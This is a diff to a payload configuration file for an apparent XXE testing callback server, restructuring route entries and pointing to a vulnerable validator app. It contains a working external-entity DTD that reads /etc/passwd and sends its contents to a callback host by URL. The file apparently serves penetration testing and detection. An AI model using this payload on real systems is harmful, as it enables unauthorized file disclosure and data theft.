@@ -3,10 +3,9 @@ title: XXE
 description: More XXE
 weight: 1
 payloads:
-  - type: HTTPX
-    project_id: 1
-    sort_order: 1
+  - sort_order: 1
     pattern: /dt$
+    is_final: true
     data:
       headers:
       Content-Type: text/xml
@@ -18,10 +17,9 @@ payloads:
         ]>
         <foo>&xxe;</foo>
 
-  - type: HTTPX
-    project_id: 1
-    sort_order: 1
+  - sort_order: 1
     pattern: /evil\.dtd$
+    is_final: true
     data:
       headers:
         Content-Type: text/xml
@@ -29,10 +27,17 @@ payloads:
         <!ENTITY % payl SYSTEM "file:///etc/passwd">
         <!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .NotifyString }}/xxe?p=%payl;'>">
 
-  - type: HTTPX
-    project_id: 1
-    sort_order: 1
+  - sort_order: 1
+    pattern: /xxe-test$
+    is_final: true
+    data:
+      headers:
+        Content-Type: text/plain
+      body: I should be loaded from http://{{ .Host }}/dt
+
+  - sort_order: 1
     pattern: /ht$
+    is_final: true
     data:
       headers:
         Content-Type: text/html
@@ -47,6 +52,9 @@ payloads:
 ---
 
 ### /dt
+
+A vulnerable application for testing is in [../../../../cmd/xodbox-validator](../../../../cmd/xodbox-validator)
+
 
 ### /evil.dtd
 
